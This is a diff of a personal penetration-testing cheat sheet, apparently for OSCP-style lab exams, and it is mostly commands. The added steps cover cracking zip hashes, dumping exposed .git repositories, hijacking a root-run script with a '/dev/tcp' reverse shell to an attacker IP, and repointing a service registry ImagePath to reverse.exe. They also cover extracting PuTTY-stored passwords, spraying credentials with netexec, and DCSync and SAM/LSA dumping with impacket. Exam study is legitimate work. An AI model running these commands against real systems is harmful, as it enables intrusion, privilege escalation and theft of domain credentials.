@@ -152,13 +152,21 @@ john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 #### ==🔵.zip files==
 
 ```
-zip2john winrm_backup.zip > hello
+zip2john winrm_backup.zip > ziphash
 ```
 
 ```
-john hello --wordlist=/usr/share/wordlists/rockyou.txt
+john ziphash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
+open the zip and search for any passwords/secrets
+
+then check for password reuse as well
+```
+sudo su
+or 
+su root
+```
 #### ==🔵.pfx files==
 
 It's a certificate file which you can use for authentication 
@@ -277,7 +285,7 @@ cd C:\Temp
 
 ----
 
-### ==🔴Linux → Windows (EASIEST)==
+### ==🔴Linux → Windows (wget)==
 
 on kali :
 ```
@@ -290,7 +298,7 @@ wget <kali ip>/<file name> -o <file name>
 OR
 wget -usebasicparsing <kali ip>/PowerUp.ps1 -o PowerUp.ps1
 ```
-### ==🔴Linux  → Linux (EASIEST)==
+### ==🔴Linux  → Linux (curl/wget)==
 
 FIRST SWITCH TO :
 ```
@@ -305,6 +313,14 @@ download on other linux :
 curl http://<ip>:80/filename -o filename
 or
 wget http://<ip>:80/filename
+```
+
+### ==🔴Linux  → Linux (scp)==
+
+On kali (attacker machine) :
+```
+scp <victim username>@<victim ip>:<full path to file> .
+# example path : /opt/backup/sitebackup3.zip
 ```
 
 ### ==🟢Transfer `nc.exe` to windows : ==
@@ -474,7 +490,7 @@ nc64.exe -e cmd.exe 192.168.163.199 4444
 ```
 
 -----
-### ==🟢Tf the victim linux doesn't have wget , curl , nc , ping: ==
+### ==🟢If the victim linux doesn't have wget , curl , nc , ping: ==
 
 we'll use python to transport it
 
@@ -1166,25 +1182,27 @@ cve 2007-4560 poc (github also)
 pip install -r requirements.txt --break-system-packages
 ```
 
-#### ==🔵Methodology : ==
+#### ==🔴Methodology : ==
 
 1. [ ] check exploit for version of smb
 2. [ ] visit website on the all ports running http , don't go by the port number only
-3. [ ] visit the webistes with `https://` also , even though it says `http://`
-4. [ ] Browse to a non-existent path on the website to check if it gives version number
-5. [ ] for all services running , check thier version number and search for their exploit
-6. [ ] if there's a lfi , search where the configuration files of the service is , then read it using the lfi
-7. [ ] search for `<service name>/<website name>` exploit on google , read the exploit to check if we have to change the ip and port and start up a listener
-8. [ ] use wappalyzer
-9. [ ] to run python exploit try both `python2 abc.py` and `python3 abc.py`
-10. [ ] use last resort of msfconsole , it the exploit requires heavy modification , do rest 2 machines first then
-11. [ ] Check default credentials. Find a username without a password? Guess the username as a password. Did you check publicly exposed documents for usernames?
-12. [ ] Also, password reuse is absolutely a thing. Find a new username or password? Respray, especially with netexec (nxc) on Windows. And remember, spray usernames as passwords.
-13. [ ] visit all ports on the ip with http running  and directory brute force all those ports
-14. [ ] if a website has login use default credentials first `admin:admin` / `admin:password` ; or search for the default credentials of that web app online
-15. [ ] view page source code for any `vhost` or any hint
-16. [ ] Check: `/robots.txt, /sitemap.xml, /sitemap, /.git/, /.env, /web.config, /backup.zip, /<hostname>.zip`
-17. [ ] after you upload a reverse shell 
+3. [ ] Check the webiste name or any name or version name on searchsploit
+4. [ ] visit the webistes with `https://` also , even though it says `http://`
+5. [ ] Browse to a non-existent path on the website to check if it gives version number
+6. [ ] for all services running , check their version number and search for their exploit
+7. [ ] `<url>`/.git
+8. [ ] Check: `/robots.txt, /sitemap.xml, /sitemap, /.git/, /.env, /web.config, /backup.zip, /<hostname>.zip`
+9. [ ] if there's a lfi , search where the configuration files of the service is , then read it using the lfi
+10. [ ] search for `<service name>/<website name>` exploit on google , read the exploit to check if we have to change the ip and port and start up a listener
+11. [ ] use wappalyzer
+12. [ ] to run python exploit try both `python2 abc.py` and `python3 abc.py`
+13. [ ] use last resort of msfconsole , it the exploit requires heavy modification , do rest 2 machines first then
+14. [ ] Check default credentials. Find a username without a password? Guess the username as a password. Did you check publicly exposed documents for usernames?
+15. [ ] Also, password reuse is absolutely a thing. Find a new username or password? Respray, especially with netexec (nxc) on Windows. And remember, spray usernames as passwords.
+16. [ ] visit all ports on the ip with http running  and directory brute force all those ports
+17. [ ] if a website has login use default credentials first `admin:admin` / `admin:password` ; or search for the default credentials of that web app online
+18. [ ] view page source code for any `vhost` or any hint
+19. [ ] after you upload a reverse shell 
 - [ ] you have to browse also to the file location `http://192.168.142.16/shell.php`
 - [ ] or find the folder where it is getting uploaded 
 - [ ] or if you uploaded a web shell : `http://192.168.142.16/shell.php?cmd=id`
@@ -1196,11 +1214,10 @@ pip install -r requirements.txt --break-system-packages
 19. [ ] ident
 20. [ ] ssh login , same password as username
 21. [ ] ssh brute force
-22. [ ] `<url>`/.git
-23. [ ] if you find any files like `.zip` on the website , download it and see the files, what content it has
-24. [ ] magic bytes : file upload bypass
+22. [ ] if you find any files like `.zip` on the website , download it and see the files, what content it has
+23. [ ] magic bytes : file upload bypass
 
-#### ==🔵Methodology (other): ==
+#### ==🔴Methodology (other): ==
 
 try every cred you find everywhere, password reuse shows up a lot
 
@@ -1941,13 +1958,15 @@ Install Git Dumper if necessary :
 ```
 pip install git-dumper
 ```
+or `https://github.com/arthaud/git-dumper`
+
 Dump the repository:
 ```
-git-dumper http://bullybox.local/.git randomname
+git-dumper http://bullybox.local/.git git
 ```
 Navigate through the downloaded files:
 ```
-cd randomname
+cd git
 ```
 
 Search for credentials:
@@ -1963,6 +1982,17 @@ You can also inspect the Git history:
 git log
 ```
 This can reveal information that is no longer present in the latest source files.
+
+------------
+OR 
+
+Search for credentials:
+```
+git diff-tree -p HEAD
+```
+
+Login to FTP and ssh, and we got local.txt
+login to ftp as well and check for local flag
 
 ##### ==🔵RMS (Restaurant Management System) : ==
 
@@ -3142,7 +3172,7 @@ then enter the same password as the username
 11. kernel exploits
 12. ssh keys
 13. check after `id` which group you are in , `docker` or `disk`
-14. always check `/opt` also ; see if has any scripts running , `ls -la` to check if root is running it , or it has any suid/sgid binaries present
+14. always check `/opt` also ; see if has any scripts running , `ls -la` to check if root is running it , or it has any suid/sgid binaries present , or if it has any zip file present to be cracked
 15. crontabs check (everything after `# -> commented out lines` ends is a cron)
 16. run process spy (pspy) , look for scripts running as root and check your permissions on them `ls -la <script path>`
 17. Capabilities `getcap -r / 2>/dev/null`
@@ -3959,7 +3989,11 @@ run :
 - The command tells you what is being executed.
 Wait for 15 minutes max
 
+Also for other UID , check what all users are in the `root` group by reading `/etc/passwd` because user UID can be of non-root but it can be in the `root` group
+
 ##### ==🔴Modifiable permissions on scripts running by root (UID=0)==
+
+==🔵EXAMPLE 1 : ==
 
 see for any script running as root `CMD: UID=0 PID=2687 | /bin/bash /opt/log-backup.sh `
 and check you permissions on the script
@@ -3976,6 +4010,28 @@ Then on Kali, start a netcat listener.
 nc -nvlp 4444
 ```
 After waiting a bit, we get a connection back as root.
+
+==🔵EXAMPLE 2 : ==
+
+If you see execute so many time
+```
+CMD: UID=0  PID=7928 | python /usr/bin/asinfo -v STATUS
+```
+
+Check permissions
+```
+ls -al /usr/bin/asinfo
+# ex. lrwxrwxrwx
+```
+Insert the reverse shell payload
+```
+echo "bash -i >& /dev/tcp/192.168.45.217/443 0>&1" > /usr/bin/asinfo
+```
+Start your listener on Kali
+```
+rlwrap -cAr nc -lvnp 443
+```
+Verify access after receiving the shell
 
 ##### ==🔴Absolute path not mentioned of binary==
 
@@ -4569,7 +4625,7 @@ now from starting again try all privelege escalation vector since this is a new 
 
 # ==🟣Windows Privilege Escalation==
 
-==🔴To escalate to nt authority\system in same shell only and not need a rever shell :==
+To escalate to nt authority\system in same shell only and not need a rever shell :
 ```
 .\PrintSpoofer64.exe -i -c cmd
 ```
@@ -4577,21 +4633,186 @@ now from starting again try all privelege escalation vector since this is a new 
 World writeable :
 ```
 C:\Windows\Temp
+C:\Windows\Tasks
+```
+#### ==🔴Methodology : ==
+
+First run
+```
+whoami /all
+```
+if you are in administrators group but have medium integrity level , do UAC bypass
+
+then PrivEscCheck, then PowerUp, then WinPEAS.
+
+- Quick check C:\ drive for non default folders.
+- `tree /F /A .` on C:/Users/ directory, look for suspicious files.
+- Quick check Program Files to find non default Software
+
+- Check in `C:\` folder if you have any not original file like `windows.old` and if it has sam and system which you can download and dump
+- Find stored credentials of putty
+In powershell , run : 
+```
+reg query HKCU\Software\SimonTatham\PuTTY\Sessions /t REG_SZ /s
+```
+- check powershell history
+
+#### ==🔵General : ==
+
+Find Flag 
+do manually first : `users > desktop/documents`
+```
+where /r C:\ local.txt
+where /r C:\ proof.txt
 ```
 
-transfer winpeas to windows
-on kali :
+==🔵if we didn't wanted a call back to our listener using a reverse shell==
+==🔵we could have gotten system in same shell as well==
 ```
-python3 -m http.server 80
+PrintSpoofer64.exe -c "C:\Windows\System32\cmd.exe" -i
+# instead of reverse.exe we replaces it with cmd location
 ```
-on windows :
-```
-wget 10.10.14.63/winPEASx64.exe -o winPEASx64.exe
-```
-it will take up some time to receive
 
-==🔴Look for :==
-1. Looking for AutoLogon credentials
+==🔵To check for our permissions on a file : ==
+switch to PowerShell : 
+```
+powershell
+```
+run : 
+```
+Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\services\regsvc | fl
+```
+check for `Access : NT AUTHORITY\INTERACTIVE Allow  FullControl`
+check for `Everyone`
+we only look for  W (Write-only access)* , M (Modify access), F (Full access) for our group
+so it means we can edit this path 
+or 
+```
+icacls .
+# "." here is current folder , for a location enter folder location
+```
+
+==🔵Admin to System privilege escalation :==
+To get a local service shell if you are an admin 
+```
+C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
+```
+get `PSExec64.exe` and a reverse shell in same folder
+from here check `whoami /priv` or try other methods and escalate to system
+Check "Windows UAC Bypass" for Admin Medium to High Integrity privilege escalation
+
+==🔵If in powershell you are unable to execute scripts : ==
+```
+powershell -executionpolicy bypass
+```
+
+##### ==🔵Basic Manual enumeration : ==
+###### User 
+to check current user 
+```
+whoami
+```
+you need to get till "NT AUTHORITY\SYSTEM" or "Administrator"
+to see what all users are present on system 
+```
+net user
+```
+to check which group the user belongs to 
+```
+net user <username>
+```
+###### Group : 
+to see which all groups i am added to and Mandatory Label: 
+```
+whoami /groups
+```
+to see what all groups are made 
+```
+net localgroup
+```
+to see which all users are present in a particular group : 
+```
+net localgroup <group name>
+```
+to see what all users are in the administrators group : 
+```
+net localgroup administrators
+```
+###### OS : 
+details about system (ex. kernel version , OS name , Hotfix) : 
+```
+systeminfo
+```
+Windows hotfixes and security updates installed on the machine : 
+```
+wmic qfe get *
+```
+###### Processes : 
+so see what all processes are running
+```
+tasklist
+tasklist /v               # for verbose
+tasklist /svc             # processes mapped to services
+```
+###### Network : 
+for  IP Address , Gateway :
+```
+ipconfig /all
+```
+routing table : 
+```
+route print
+```
+to see internally which all ports are open which were not visible from outside : 
+```
+netstat -ano
+```
+Firewall settings for the currently active network profile : 
+```
+netsh advfirewall show currentprofile
+```
+all Windows Firewall rules configured on the computer :
+to check if port forwarding or reverse shells are not working 
+```
+netsh advfirewall firewall show rule name=all
+```
+###### Scheduled Tasks : 
+```
+schtasks /query /fo list /v
+or
+powershell Get-ScheduledTask
+```
+
+to see what all applications are installed : 
+```
+wmic product get *
+wmic product get Caption, Description, InstallLocation, Name
+```
+
+Which all files do I have Read/Write permission to :
+```
+accesschk.exe -accepteula -uws "Users" "C:\Program Files" 2>nul
+# for "users" group
+```
+
+to check all installed services : 
+```
+sc query
+```
+
+to check which all binaries have auto elevate privileges enabled :
+```
+reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
+```
+
+to set integrity level of a file : 
+```
+icacls <file name> /setintegritylevel m
+# m = medium 
+# h = high
+# you cannot set integrity level higher than that of your user
+```
 #### ==🔵Run Powerup.ps1 first then PrivescCheck :==
 
 Run `PowerUp.ps1` to look for privilege escalation vectors
@@ -4796,176 +5017,10 @@ now transfer netcat to this location : `C:\windows\tasks\nc.exe`
 then : 
 ```
 
-#### ==🔵Methodology : ==
 
-First run
-```
-whoami /all
-```
-if you are in administrators group but have medium integrity level , do UAC bypass
-
-then PrivEscCheck, then PowerUp, then WinPEAS.
-
-- Quick check C:\ drive for non default folders.
-- `tree /F /A .` on C:/Users/ directory, look for suspicious files.
-- Quick check Program Files to find non default Software
-#### ==🔵General : ==
-
-Find Flag 
-do manually first : `users > desktop/documents`
-```
-where /r C:\ local.txt
-where /r C:\ proof.txt
-```
-
-==🔵if we didn't wanted a call back to our listener using a reverse shell==
-==🔵we could have gotten system in same shell as well==
-```
-PrintSpoofer64.exe -c "C:\Windows\System32\cmd.exe" -i
-# instead of reverse.exe we replaces it with cmd location
-```
-
-==🔵To check for our permissions on a file : ==
-switch to PowerShell : 
-```
-powershell
-```
-run : 
-```
-Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\services\regsvc | fl
-```
-check for `Access : NT AUTHORITY\INTERACTIVE Allow  FullControl`
-check for `Everyone`
-we only look for  W (Write-only access)* , M (Modify access), F (Full access) for our group
-so it means we can edit this path 
-or 
-```
-icacls .
-# "." here is current folder , for a location enter folder location
-```
-
-==🔵Admin to System privilege escalation :==
-To get a local service shell if you are an admin 
-```
-C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
-```
-get `PSExec64.exe` and a reverse shell in same folder
-from here check `whoami /priv` or try other methods and escalate to system
-Check "Windows UAC Bypass" for Admin Medium to High Integrity privilege escalation
-
-==🔵If in powershell you are unable to execute scripts : ==
-```
-powershell -executionpolicy bypass
-```
-
-##### ==🔵Basic Manual enumeration : ==
-###### User 
-to check current user 
-```
-whoami
-```
-you need to get till "NT AUTHORITY\SYSTEM" or "Administrator"
-to see what all users are present on system 
-```
-net user
-```
-to check which group the user belongs to 
-```
-net user <username>
-```
-###### Group : 
-to see which all groups i am added to and Mandatory Label: 
-```
-whoami /groups
-```
-to see what all groups are made 
-```
-net localgroup
-```
-to see which all users are present in a particular group : 
-```
-net localgroup <group name>
-```
-to see what all users are in the administrators group : 
-```
-net localgroup administrators
-```
-###### OS : 
-details about system (ex. kernel version , OS name , Hotfix) : 
-```
-systeminfo
-```
-Windows hotfixes and security updates installed on the machine : 
-```
-wmic qfe get *
-```
-###### Processes : 
-so see what all processes are running
-```
-tasklist
-tasklist /v               # for verbose
-tasklist /svc             # processes mapped to services
-```
-###### Network : 
-for  IP Address , Gateway :
-```
-ipconfig /all
-```
-routing table : 
-```
-route print
-```
-to see internally which all ports are open which were not visible from outside : 
-```
-netstat -ano
-```
-Firewall settings for the currently active network profile : 
-```
-netsh advfirewall show currentprofile
-```
-all Windows Firewall rules configured on the computer :
-to check if port forwarding or reverse shells are not working 
-```
-netsh advfirewall firewall show rule name=all
-```
-###### Scheduled Tasks : 
-```
-schtasks /query /fo list /v
-or
-powershell Get-ScheduledTask
-```
-
-to see what all applications are installed : 
-```
-wmic product get *
-wmic product get Caption, Description, InstallLocation, Name
-```
-
-Which all files do I have Read/Write permission to :
-```
-accesschk.exe -accepteula -uws "Users" "C:\Program Files" 2>nul
-# for "users" group
-```
-
-to check all installed services : 
-```
-sc query
-```
-
-to check which all binaries have auto elevate privileges enabled :
-```
-reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
-reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
-```
-
-to set integrity level of a file : 
-```
-icacls <file name> /setintegritylevel m
-# m = medium 
-# h = high
-# you cannot set integrity level higher than that of your user
-```
 #### ==🔵Winpeas (Look for easy wins here first)==
+
+##### ==🔴Setup : ==
 ###### If nothing works , then try Winpeas
 Download `winPEASx64.exe` : 
 ```
@@ -4978,7 +5033,10 @@ python3 -m http.server 8000
 
 ```
 certutil -f -urlcache http://192.168.142.71:8000/winPEASx64.exe "winPEASx64.exe"
+OR 
+wget 10.10.14.63/winPEASx64.exe -o winPEASx64.exe
 ```
+it will take up some time to receive
 
 run : 
 ```
@@ -5004,6 +5062,8 @@ copy <input file name> \\<kali ip>\share\<output file name>
 # ex. copy windows.txt \\192.168.131.128\share\windows.txt
 ```
 
+##### ==🔴Search the output : ==
+
 For searching a specific thing in winpeas : 
 ```
 grep -aiA 10 "Looking if you can modify any service registry" windows.txt
@@ -5013,6 +5073,9 @@ grep -aiA 10 "putty" windows.txt
 ```
 
 if found creds in putty , login using ssh
+
+==🔴Look for :==
+1. Looking for AutoLogon credentials
 
 ### ==🟢Service Abuse : ==
 
@@ -5611,7 +5674,7 @@ now we modify the original registry path so that the service loads our reverse s
 reg add HKLM\System\CurrentControlSet\services\regsvc /v ImagePath /d "C:\temp\reverse.exe" /f
 ```
 
-now we check if we start this service oursef or not 
+now we check if we start this service ourself or not 
 ```
 sc qc regsvc
 ```
@@ -5906,6 +5969,27 @@ Format: RID : LM hash : NT hash
 ```
 
 ### ==🟢Other Windows Components==
+
+#### ==🔵Putty==
+
+Found PUTTY has installed at `C:\Program Files`
+
+PUTTY stores user credentials in plain text in windows registry, and we got the user password
+https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.002/T1552.002.md
+
+In powershell , run : 
+```
+reg query HKCU\Software\SimonTatham\PuTTY\Sessions /t REG_SZ /s
+```
+
+you will find password like : 
+```
+zachary:h3R@tC@tch3r
+```
+
+Connect with RDP as username, but still can't found proof.txt
+until I run the powershell as administrator
+so run powershell as administrator
 
 #### ==🔵Kernel Exploitation ==
 
@@ -8254,6 +8338,9 @@ see other ldap commands also
 ------
 
 Spray initial credentials for access to all machines you have access to : 
+
+So no list here initially , only 'username' and 'password' for initial creds
+
 ```
 netexec smb <IPlist> -u usernamelist -p passwordlist --continue-on-success
 ```
@@ -8294,7 +8381,8 @@ queries :
 2. users with dc-sync privleges
 3. all kerberoastable users
 4. as-rep roastable users
-5. shortest path to domain admins
+5. shortest path from owned objects
+6. shortest path to domain admins
 
 -----
 
@@ -8304,6 +8392,8 @@ rdate -n <DC IP>
 ```
 
 ----
+
+Check manually also even if bloodhound doesn't show anything :
 
 do kerberoasting (if found)
 crack hash
@@ -8393,14 +8483,27 @@ HACK-ACADEMY.LOCAL/price
 ```
 
 Crack the lsa (mcash hash) 
-password spray for login to rdp or winrm for all other ips
 
+==🔴update username and password list with new username and password==
+
+password spray for login to rdp or winrm for all other ips
+see above commands for all 3 , smb , winrm and rdp
 Then login to the dc using evil-winrm or rdp
 
 then move on to other IP you have the login creds of 
 then dump that machine hashes 
 then next one 
 THEN PASSWORD SPRAY ON EVERY IP using smb first
+
+-------
+
+On bloodhound , check for all all usernames (and pass) you got 
+Check `Members of`
+if it is part of any `Sync` group 
+then try DC SYNC
+
+Domain Admin membership is not required for DCSync.
+An account with the necessary directory replication rights can perform it too.
 
 --------
 
@@ -8440,6 +8543,10 @@ check if it says `pwned or not` i.e if the `user` is admin already on a machine 
 netexec smb iplist.txt -u 'username' -p 'password'
 ```
 
+----
+
+Check in `C:\` folder if you have any not original file like `windows.old` and if it has sam and system which you can download and dump
+
 ---------
 
 login to domain admin
@@ -8448,6 +8555,10 @@ login to domain admin
 
 (CAN SKIP)
 dump ntds for hashes of all the users in the entire domain
+
+----
+
+check powershell history
 
 ## ==🟢Tools Setup & Run :== 
 
@@ -9540,22 +9651,31 @@ THEN RUN THE `ADDMEMBER` COMMAND AGAIN AND THEN AGAIN RUN THE `VERIFY` COMMAND
 
 now run DCSync and then pass the hash of administrator
 
-### ==🔵(Try DCSync on all kinds of usernames you got) - Dump NTLM hashes for that machine : all domain accounts, including the Administrator : ==
+### ==🔵DCSync : ==
 
 Domain Admin membership is not required for DCSync.
 An account with the necessary directory replication rights can perform it too.
 
+On bloodhound , check for all all usernames (and pass) you got 
+Check `Members of`
+if it is part of any `Sync` group 
+then try DC SYNC
+
 run DCSync attack using Impacket’s `secretsdump.py`:
 ```
-impacket-secretsdump vulnnet-rst.local/<admin-user>@<target-ip>
+impacket-secretsdump vulnnet-rst.local/<username>@<target-ip>
 ```
-==🔴TRY FOR ALL IP'S YOU HAVE INDIVIDUALLY for all usernames==
+OR
+```
+impacket-secretsdump 'hack-academy.local'/'<username>':'<Password>'@'<dc ip>'
+```
 
 Only this category is of our use : 
 ```
 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
 ```
 This dumped NTLM hashes for all domain accounts, including the Administrator.
+so we get administrator of DC which is the domain admin
 
 
 ### ==🔵whoami /all (Privileges and groups)==
@@ -10213,6 +10333,8 @@ well get a reverse shell back
 
 ### ==🔵PrivescCheck (if in winrm powerup doesn't work) :==
 
+#### ==🟢Change the Service Executable path ==
+
 Or see Windows privelege escalation > Service Abuse > Method 2 : Change the Service Executable path 
 
 -----
@@ -10294,6 +10416,66 @@ now transfer netcat to this location : `C:\windows\tasks\nc.exe`
 then : 
 ```
 
+#### ==🟢Weak Registry Permissions (changing path of executable in registry)==
+
+Or see Windows privilege escalation > Registry Attacks > Weak Registry Permissions (changing path of executable in registry)
+
+----
+
+Severity : High
+
+TA0004
+Name : Services : Registry permissions 
+
+Modifiable path : `<has a registry path>`
+
+now we get details about this service in registry for full `ImagePath`
+```
+reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\regsvc
+```
+
+we check for our permissions on the path :
+switch to PowerShell
+```
+Get-Acl -Path "HKLM\System\CurrentControlSet\services\regsvc" | fl
+```
+Look for `Access : NT AUTHORITY\INTERACTIVE Allow  FullControl`
+
+now we make a reverse shell 
+switch to :temp folder on windows :
+```
+cd C:\temp
+```
+download on windows :
+```
+certutil -f -urlcache http://192.168.163.199:8000/reverse.exe reverse.exe
+```
+
+now we modify the original registry path so that the service loads our reverse shell
+```
+reg add HKLM\System\CurrentControlSet\services\regsvc /v ImagePath /d "C:\temp\reverse.exe" /f
+```
+
+now we check if we start this service ourself or not 
+```
+sc qc regsvc
+```
+also check `BINARY_PATH_NAME` here to see if path changed or not
+if it says `START_TYPE : DEMAND_START` , we can start it manually
+
+start listener on kali 
+```
+rlwrap -cAr nc -lvnp 4444
+```
+
+we start the service now 
+```
+sc start regsvc
+```
+we get a shell back 
+
+
+
 
 ### ==🔵Winpeas :==
 
@@ -10345,6 +10527,8 @@ USE THE IPLIST INSTEAD OF THE SINGLE IP
 ```
 HACK-ACADEMY.LOCAL/price
 ```
+
+==🟡Remember to dump sam , lsa , lsass all Because all can have different credentials==
 
 ==🔴**Dump SAM - requires local admin==**
 ==🔴use the ip here of the machine you are admin on ==
